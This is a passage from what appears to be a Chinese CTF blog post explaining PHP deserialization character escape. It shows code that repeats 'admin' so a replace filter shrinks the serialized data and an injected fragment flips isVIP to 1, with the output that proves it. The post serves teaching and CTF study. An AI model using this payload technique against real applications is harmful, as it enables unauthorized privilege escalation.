+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>发现如果username值存在<code>admin</code>,会被替换为 <code>hack</code> ，长度减一</p>
+<p>此处输出的username值的长度已经不符合5了</p>
+<p>我们也要想办法构造，使得 <code>isVIP=1</code>  ，我们对比一下现有子串和目标子串：（长度为47）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125; //现有</span><br><span class="hljs-string">&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125; <span class="hljs-comment">//目标</span><br></code></pre></td></tr></table></figure>
+
+<p>php反序列化有一个特性：</p>
+<p><strong>当序列化字符串属性的长度不够时，会往后走，直到长度与规定的长度相等为止.</strong></p>
+<blockquote>
+<p>例如，此处序列化字符串属性值 <code>hack</code> 的长度为4，但是原本属性长度为5，所以会往后走1位，属性值为： <code>hack&quot; </code>  把后面的双引号也算进去了。也就是说不根据双引号判断一个字符串是否已经结束，而是根据前面规定的数量来读取字符串。</p>
+</blockquote>
+<p>我们计算一下<strong>本可控变量末尾到下一可控变量的长度</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span>   <span class="hljs-comment">//长度为22</span><br></code></pre></td></tr></table></figure>
+
+<p>因为每次过滤都会少一个字符，我们先将 admin重复22遍：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="hljs-string">&#x27;123456&#x27;</span>);<br><span class="hljs-variable">$a_seri</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a_seri_filter</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a_seri</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_seri_filter</span>;<br></code></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">105</span>:<span class="hljs-string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/04/KvXBduNPCS8A9qF.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>也就是说<strong>123456</strong>这个地方成为了我们的可控变量，在<strong>123456</strong>可控变量的位置中添加我们的目标子串</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:6:&quot;</span><span class="hljs-number">123456</span><span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:1;&#125;	//目标子串</span><br></code></pre></td></tr></table></figure>
+
+<p>即：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>我们构造对象，序列化后过滤，再输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">105</span>:<span class="hljs-string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">47</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>仔细观察这一串字符串可以看到紫色方框内一共107个字符，但是前面只有显示105</p>
+<p><img src="https://s2.loli.net/2023/01/04/QmBVMJCvFbYZ8cx.jpg" srcset="/img/loading.gif" lazyload alt="20210820131653.png"></p>
+<p><strong>造成这种现象的原因是</strong>：替换之前我们目标子串的位置是<strong>123456</strong>，一共<strong>6</strong>个字符，替换之后我们的目标子串显然超过<strong>10</strong>个字符，所以会造成计算得到的payload不准确</p>
+<p><strong>解决办法是</strong>：多添加<strong>2</strong>个<strong>admin</strong>，这样就可以补上缺少的字符。长度再减2</p>
+<p>最终代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">user</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$isVIP</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$u</span>,<span class="hljs-variable">$p</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$u</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$p</span>;<br><span class="hljs-variable language_">$this</span>-&gt;isVIP = <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;hack&quot;</span>,<span class="hljs-variable">$s</span>);<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">user</span>(<span class="hljs-string">&#x27;adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin&#x27;</span>,<span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:6:&quot;123456&quot;;s:5:&quot;isVIP&quot;;i:1;&#125;&#x27;</span>);<br><span class="hljs-variable">$a_seri</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a_seri_filter</span> = <span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$a_seri</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a_seri_filter</span>;<br></code></pre></td></tr></table></figure>
+
+<p>输出结果：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">115</span>:<span class="hljs-string">&quot;hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">47</span>:<span class="hljs-string">&quot;&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;password&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;123456&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;isVIP&quot;</span>;i:<span class="hljs-number">1</span>;&#125;<span class="hljs-string">&quot;;s:5:&quot;</span>isVIP<span class="hljs-string">&quot;;i:0;&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/04/jnr7t4KDGWmdl2S.jpg" srcset="/img/loading.gif" lazyload alt="image-20210820130134043"></p>
+<p>这样长度就对上了。我们将反序列化后的对象输出：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">user <span class="hljs-title function_ invoke__">Object</span><br>(<br>    [username] =&gt; hackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhackhack<span class="hljs-string">&quot;;s:8:&quot;</span>password<span class="hljs-string">&quot;;s:47:&quot;</span><br>    [password] =&gt; <span class="hljs-number">123456</span><br>    [isVIP] =&gt; <span class="hljs-number">1</span><br>)<br></code></pre></td></tr></table></figure>
+
+<p>此时 isVIP&#x3D;1 ，字符逃逸成功！</p>
+<h1 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/285985.html">PHP反序列化字符逃逸详解</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/" class="print-no-link">#php反序列化字符逃逸</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>php反序列化字符逃逸</div>
+      <div>https://leekosss.github.io/2023/08/24/php反序列化字符逃逸/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>leekos</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年8月24日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年6月5日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/08/24/php%20filter%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/08/24/NKCTF2023/" title="NKCTF2023">
+                        <span class="hidden-mobile">NKCTF2023</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz","appKey":"esLROw9j3xLk2nV4tQkKaih1","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      赣ICP备2022008842号-2
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
